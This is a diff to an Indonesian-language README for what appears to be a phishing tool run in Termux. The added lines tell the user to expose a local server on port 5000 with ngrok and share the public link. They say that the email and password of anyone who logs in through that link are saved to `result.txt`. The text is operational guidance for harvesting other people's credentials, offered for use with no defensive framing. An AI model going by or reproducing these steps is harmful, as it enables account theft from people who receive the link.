@@ -40,4 +40,6 @@ __Install Ngrok :__
 __Autentikasi Ngrok:__
 - Setelah Ngrok terinstall, kamu perlu menghubungkan akun Ngrok kamu dengan menjalankan token autentikasi. Kamu bisa mendapatkan token dari [dashboard Ngrok](https://ngrok.com/) setelah mendaftar.
 
-- Jika Ngrok sudah berhasil di install, buka Termux lagi dan jalankan perintah `./ngrok http 5000`. Ngrok akan menampilkan URL publik yang bisa diakses secara online, misalnya `https://random-string.ngrok.io` Salin URL ini lalu share ENJOYY.
+- Saya anggap Ngrok sudah berhasil di install, jika sudah buka Termux lagi dan jalankan perintah `./ngrok http 5000`. Ngrok akan menampilkan URL publik yang bisa diakses secara online, misalnya `https://6ehhdj3773u3ujrn.ngrok.io` Salin URL ini lalu share ENJOYY.
+
+- Jika ada yang login melalui link yang kamu bagikan, Email dan Password akan muncul di dalam file `result.txt` yang berada di dalam folder chace.
